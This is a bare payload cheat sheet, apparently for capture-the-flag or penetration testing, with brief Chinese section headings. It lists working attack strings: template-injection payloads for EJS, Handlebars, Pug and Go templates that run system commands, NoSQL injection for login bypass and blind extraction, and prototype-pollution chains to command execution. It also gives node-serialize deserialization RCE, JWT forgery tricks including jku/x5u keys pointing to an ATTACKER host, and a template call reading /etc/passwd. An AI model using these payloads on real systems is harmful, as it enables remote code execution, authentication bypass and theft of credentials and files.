# EJS
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= require('child_process').execSync('id').toString() %>
# Handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
# Pug / Jade
#{global.process.mainModule.require('child_process').execSync('id')}
# 探测
{{7*7}}  #{7*7}  ${7*7}

{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^a"},"password":{"$ne":"x"}}
{"username":"admin","password":{"$gt":""}}
# URL 编码形式
username[$ne]=x&password[$ne]=x
username[$regex]=^adm&password[$gt]=
# 盲注（正则逐位）
{"$where":"this.password.match(/^a/)!=null"}
{"$where":"sleep(3000)||true"}
# 数组绕过
username=admin&password[$in][]=1
# 原型污染配合
{"__proto__":{"$ne":1}}

# 1) 污染入口
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
# 2) 检测
{}.polluted
# 3) 打 child_process（NODE_OPTIONS 注入）
{"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id').toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}
{"__proto__":{"env":{"EVIL":"console.log(process.mainModule.require('child_process').execSync('id').toString())//"},"shell":"/proc/self/exe","argv0":"console"}}
# 4) 打 ejs
{"__proto__":{"client":true,"escapeFunction":"1;return global.process.mainModule.require('child_process').execSync('id');"}}
# 5) 打 lodash.template
{"__proto__":{"source":"<%= global.process.mainModule.require('child_process').execSync('id') %>"}}

{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
# 变体（立即执行必须带 ()）
{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}
# funcster / cryo 同源问题
# 入口：cookie（profile=）、session、缓存、socket.io 消息、Electron IPC

# 1) alg=none
{"alg":"none","typ":"JWT"}
# 2) jku 指向自己的 JWKS
{"alg":"RS256","jku":"http://ATTACKER/jwks.json","kid":"k1"}
# 3) x5u
{"alg":"RS256","x5u":"http://ATTACKER/cert.pem"}
# 4) kid 路径穿越（密钥读文件）
{"alg":"HS256","kid":"../../../../dev/null"}
# 5) kid SQL 注入
{"alg":"HS256","kid":"x' union select 'secret'-- -"}
# 6) HS256 用公钥当密钥
jwt.sign({user:'admin'}, publicKey, {algorithm:'HS256'})

{{.}}
{{printf "%s" .}}
{{.Password}}
# text/template 可调用导出方法
{{.ReadFile "/etc/passwd"}}
{{.Exec "id"}}
